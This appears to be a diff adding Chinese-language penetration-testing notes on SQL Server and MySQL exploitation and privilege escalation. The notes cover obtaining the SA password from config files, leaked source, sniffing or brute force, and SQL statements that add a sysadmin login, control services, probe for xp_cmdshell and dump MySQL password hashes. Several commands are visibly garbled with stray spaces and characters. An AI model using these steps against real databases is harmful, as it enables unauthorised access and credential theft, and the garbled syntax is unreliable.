@@ -177,3 +177,55 @@ __通过验证码自动识别漏洞实现暴力破解登录密码。__
 #### <font color = #FFA500>测试工具:</font>
 - **burpsuite. Pkav http fuzzer**
 
+## <font color = #1E90FF>SQL Server数据库漏洞利用与提权</font>
+**SQL Server是微软推出的数据库管理软件，它主要运行在Windows平台上，最新版可以在Linux、Docker' 下安装。<BR>SQL Server版本较多,最常见的有SQL Server2000、SQL Server2005、SQLServer2008、SQL Server201 4等等。**
+### <font color = #FF0000>SQL Server提权基础:</font>
+### <font color = #FF0000>SA口令获取方法</font>
+
+- **1、Webshell或源码获取**
+ - **一般在网站的配置文件中有存放明文账号密码， 常用配置文件名如: conn.aspx. config.aspx、 config.php.web.config等。一般格式如: server=localhost;UID=sa;PWD= ichunqiu;database= ichunqiu。**
+- **2、源代码泄露**
+ - **网站源码泄露情况主要以程序员上传代码到git等开源平台或更新代码时未删除备份文件(.svn、 .git. .bak), 以及运维人员打包源代码到网站服务器(www.rar等)**
+- **3、嗅探**
+ - **在局域网中使用cain等. I具进行arp嗅探的时候可以抓取到1433端口的数据库明文登录密码。**
+- **4、口令暴力破解**
+ - **利用mssq|暴力破解工具对mssq|进行暴力破解，一旦成功将获得sa相应权限。**
+
+### <font color = #FF0000>常用的SQL Server提权语句</font>
+- **1、查看数据库版本**
+        select @ @version
+- **2、查看数据库系统参数**
+        exec master..xp_ msver;
+- **3、查看用户所属角色信息**
+        sp_ helpsrvrolemember
+- **4、查看当前数据库**
+        select db_ name()
+- **5、显示机器.上的驱动器**
+        xp_availablemedia
+- **1、查看当前账户权限**
+        select IS_ SRVROLEMEMBER('sysadmin')
+        以下类似serveradmin、setupadmin、 securityadmin、 diskadmin、 bulkadminselect IS_ .MEMBER(' db_ _owner') I
+- **2、添加用户**
+        exec master.dbo.sp addlogin test,password #添加用户
+        exec master.dbo.sp_ addsrvrolemember test,sysadmin #加权限
+- **3、启动停止服务**
+        exec master. .xp_ servicecontrol 'stop','test'
+        exec master..xp_ servicecontrol 'start'test'
+- **4、检查功能**
+        SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_ _cmdshell'
+        xp_ cmdshell. xp_ regread、 sp_ makewebtask. xp_ subdirs、 xp_ _dirtree、 sp_ addextendedproc
+
+## <font color = #1E90FF>MySQL数据库漏洞利用与提权</font>
+- **1.一般Mysql数据库经常使用php进行连接，会有较少的情况使用jsp、 python等**
+- **2、Mysq|连接文件一般为 conn.php、config.php. common.inc.php.config.inc.php等**
+- **3、所说的mysql权限提升一般在root权限下**
+
+### <font color = #FF0000>密码获取与破解</font>
+- **1、数据库查询**
+        select Host,user,password from mysql.user #需要有root权限
+- **2、配置文件中读取**
+ - **网站源码泄露情况主要以程序员上传代码到git等开源平台或更新代码时未删除备份文件(.svn、 .git. .bak), 以及运维人员打包源代码到网站服务器(www.rar等) 。**
+- **3、下载user文件**
+        user文件在mysql的data目录下
+        select @ @basedir
+        select @@plugin_ dir #>5.1
